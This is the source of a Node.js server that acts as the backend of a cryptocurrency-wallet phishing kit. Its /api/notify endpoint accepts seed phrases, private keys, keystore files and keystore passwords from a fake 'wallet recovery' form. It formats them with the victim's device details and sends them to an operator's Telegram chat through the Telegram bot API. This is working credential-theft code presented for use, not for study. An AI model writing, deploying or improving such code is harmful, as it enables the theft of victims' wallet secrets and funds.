/**
 * Local server: serves the site and /api/notify → Telegram.
 * Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in env for /api/notify to work.
 */
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const ROOT = path.resolve(__dirname);

const MIME = {
  '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
  '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg', '.gif': 'image/gif', '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon', '.woff2': 'font/woff2', '.woff': 'font/woff', '.ttf': 'font/ttf',
};

function buildMessage(body, userAgent) {
  const w = (v) => (typeof v === 'string' ? String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') : '');
  const mdCode = (v) => (typeof v === 'string' ? '`' + String(v).replace(/`/g, '\\`') + '`' : '');
  const wallet = w(body.wallet || '');
  const type = String(body.import_type || '').toUpperCase();
  const now = new Date();
  const dateTime = now.toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'medium' });
  const device = (userAgent || '').trim() || '—';

  const typeLabel = type === 'PHRASE' ? 'SEED PHRASE SUBMITTED' : (type === 'KEYSTOREJSON' ? 'KEYSTORE SUBMITTED' : 'PRIVATE KEY SUBMITTED');
  let lines = [
    '🚨 Wallet Recovery',
    '',
    '🔑 ' + typeLabel,
    '',
    '👤 Wallet: ' + (wallet || '—'),
    '',
    '🔤 Type: ' + (type || '—'),
    '',
    '🕐 Time: ' + dateTime,
    '',
    '🌍 Location: ',
    '',
    '📱 Device: ' + device,
    '',
  ];

  let parseMode = undefined;
  if (type === 'PHRASE' && body.phrase) {
    lines.push('🔒 Seed Phrase: ' + mdCode(body.phrase));
    parseMode = 'Markdown';
  } else if (type === 'KEYSTOREJSON') {
    if (body.keystorejson) lines.push('🔒 Keystore: ' + mdCode(body.keystorejson));
    if (body.keystorepassword) lines.push('Password: ' + mdCode(body.keystorepassword));
    parseMode = 'Markdown';
  } else if ((type === 'PRIVATE' || type === 'PRIVATEKEY') && body.privatekey) {
    lines.push('🔒 Private Key: ' + mdCode(body.privatekey));
    parseMode = 'Markdown';
  }

  lines.push('');
  lines.push('⚠️ User attempted wallet recovery');
  return { text: lines.join('\n'), parseMode };
}

function sendToTelegram(msg, token, chatId) {
  return new Promise((resolve, reject) => {
    const payload = { chat_id: chatId, text: msg.text, disable_web_page_preview: true };
    if (msg.parseMode) payload.parse_mode = msg.parseMode;
    const body = JSON.stringify(payload);
    const opts = {
      method: 'POST',
      hostname: 'api.telegram.org',
      path: '/bot' + token + '/sendMessage',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    };
    const req = https.request(opts, (res) => {
      let d = '';
      res.on('data', (c) => (d += c));
      res.on('end', () => {
        try { resolve(!!JSON.parse(d).ok); } catch (_) { resolve(false); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const url = req.url.split('?')[0];
  if (req.method === 'POST' && url === '/api/notify') {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'Server configuration error' }));
      return;
    }
    const userAgent = req.headers['user-agent'] || '';
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', async () => {
      let data = {};
      try { data = body ? JSON.parse(body) : {}; } catch (_) {}
      const msg = buildMessage(data, userAgent);
      if (!msg.text || msg.text.trim().length < 10) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: 'Invalid payload' }));
        return;
      }
      try {
        const ok = await sendToTelegram(msg, token, chatId);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(ok ? { ok: true } : { ok: false, error: 'Delivery failed' }));
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: 'Delivery failed' }));
      }
    });
    return;
  }

  let filePath = path.resolve(ROOT, url === '/' ? '' : url.replace(/^\//, ''));
  if (!filePath.startsWith(ROOT + path.sep) && filePath !== ROOT) {
    res.writeHead(403);
    res.end();
    return;
  }
  try {
    if (fs.statSync(filePath).isDirectory()) filePath = path.join(filePath, 'index.html');
  } catch (_) {}
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end();
      return;
    }
    res.setHeader('Content-Type', MIME[path.extname(filePath)] || 'application/octet-stream');
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log('Local server: http://localhost:' + PORT);
  console.log('Test form:    http://localhost:' + PORT + '/explore/sync.html');
});
